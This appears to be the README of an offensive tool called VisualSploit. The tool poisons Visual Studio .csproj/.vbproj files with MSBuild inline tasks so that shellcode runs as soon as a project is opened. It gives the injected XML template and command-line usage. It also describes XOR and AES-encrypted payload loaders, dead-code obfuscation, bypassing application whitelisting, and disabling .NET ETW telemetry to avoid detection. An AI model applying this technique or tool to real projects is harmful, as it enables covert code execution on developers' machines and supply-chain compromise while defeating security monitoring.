# VisualSploit

MSBuild inline task injection for fileless code execution via `.csproj`/`.vbproj` poisoning.

## Technique

Injects inline tasks into MSBuild project files using `RoslynCodeTaskFactory`. When loaded in Visual Studio, `InitialTargets="BeforeBuild"` executes before any user interaction.

The tool modifies the project XML:
```xml
<Project InitialTargets="BeforeBuild" ...>
  <UsingTask TaskName="InlineCode" TaskFactory="RoslynCodeTaskFactory" ...>
    <Task>
      <Code Type="Fragment" Language="cs"><![CDATA[
        // Payload code compiled and executed at runtime
      ]]></Code>
    </Task>
  </UsingTask>
  <Target Name="BeforeBuild">
    <InlineCode/>
  </Target>
</Project>
```

Roslyn compiles the C# at runtime. MSBuild.exe is a signed Microsoft binary that can bypass application whitelisting (AppLocker, WDAC).

## Usage

```bash
visualsploit <project> <shellcode> [options]
```

### Options

```
-o, --output <f>    Output path (default: in-place with .bak)
--no-backup         Skip backup
-m, --methods <l>   Obfuscation: shellcode,junk
-e, --encrypt       Encrypted payload loader
-r, --rounds <n>    XOR rounds 1-5 (default: 3)
-s, --seed <n>      RNG seed for reproducibility
```

### Examples

```bash
# Basic injection
visualsploit target.csproj payload.bin

# Obfuscated
visualsploit target.csproj payload.bin -m shellcode,junk

# Encrypted loader
visualsploit target.csproj payload.bin -e

# Full obfuscation
visualsploit target.csproj payload.bin -m shellcode,junk -e -s 12345
```

Shellcode formats: raw binary, hex (`0xfc,0x48,...`), or plain hex (`fc4883e4f0`)

## Obfuscation

**shellcode** - Multi-round XOR encryption with 32-byte keys generated via cryptographic RNG.

**junk** - Injects dead code (environment property reads, zero-delay sleeps).

## Encrypted Loader

Adds runtime decryption and compilation:

1. Inner payload code is AES-256-CBC encrypted at build time
2. Encrypted payload embedded as base64 in project file
3. At runtime, derives decryption key via PBKDF2 (100k iterations, SHA1, static salt)
4. Decrypts payload and compiles via `CSharpCodeProvider`
5. Invokes compiled assembly via reflection

Sets `COMPlus_EnableDiagnostics=0` and `COMPlus_ETWEnabled=0` to disable .NET ETW telemetry.

## Build

```bash
dotnet build -c Release
dotnet publish -c Release -r win-x64 --self-contained  # standalone binary
```

Requires .NET 9.0 SDK.

## License

MIT
